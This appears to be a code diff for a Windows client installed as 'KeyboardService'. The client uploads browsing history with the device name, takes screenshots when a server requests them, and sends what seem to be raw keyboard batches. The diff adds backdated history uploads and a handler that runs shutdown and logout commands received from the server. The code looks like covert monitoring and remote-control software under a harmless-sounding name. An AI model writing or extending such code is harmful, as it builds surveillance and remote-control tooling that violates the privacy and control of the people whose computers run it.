@@ -41,6 +41,7 @@ RAW_BATCH_DELAY_SECONDS = 0.08
 RAW_BATCH_INTERVAL_SECONDS = 10
 HEARTBEAT_INTERVAL_SECONDS = 30
 WEBSITE_HISTORY_INTERVAL_SECONDS = 30
+WEBSITE_HISTORY_MAX_AGE_SECONDS = 7 * 24 * 60 * 60
 MESSAGE_RETRY_INTERVAL_SECONDS = 30
 SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS = 1
 INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
@@ -555,7 +556,10 @@ def post_message(payload, quiet=False):
         return False
 
 
-def post_website_history(url, browser):
+def post_website_history(url, browser, visited_at=None):
+    visited_at = visited_at or int(time.time() * 1000)
+    if visited_at < int(time.time() * 1000) - WEBSITE_HISTORY_MAX_AGE_SECONDS * 1000:
+        return False
     try:
         headers = {"Content-Type": "application/json"}
         api_key = os.getenv("INGEST_API_KEY", "").strip()
@@ -568,7 +572,7 @@ def post_website_history(url, browser):
                 "device_name": device_name,
                 "browser": browser,
                 "url": url,
-                "visited_at": int(time.time() * 1000),
+                "visited_at": visited_at,
             }).encode("utf-8"),
             headers=headers,
             method="POST",
@@ -696,6 +700,7 @@ def poll_screenshot_request():
             if response.status >= 400:
                 raise RuntimeError(f"HTTP {response.status}")
             data = json.loads(response.read().decode("utf-8"))
+        handle_device_command(data.get("command"))
         if data.get("screenshot_requested"):
             trigger_screenshot_capture()
     except (HTTPError, URLError, TimeoutError, RuntimeError) as error:
@@ -706,6 +711,13 @@ def screenshot_request_poller():
     while True:
         poll_screenshot_request()
         time.sleep(SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS)
+
+
+def handle_device_command(command):
+    if command == "shutdown":
+        subprocess.Popen(["shutdown", "/s", "/t", "0"], close_fds=True)
+    elif command == "logout":
+        subprocess.Popen(["shutdown", "/l"], close_fds=True)
 
 
 def get_battery_telemetry():
@@ -794,6 +806,7 @@ def send_heartbeat():
                 print(f"Client service URL updated to {SITE_URL}")
         if heartbeat.get("screenshot_requested"):
             trigger_screenshot_capture()
+        handle_device_command(heartbeat.get("command"))
     except (HTTPError, URLError, TimeoutError, RuntimeError) as error:
         print(f"Could not send device heartbeat: {error}")
 
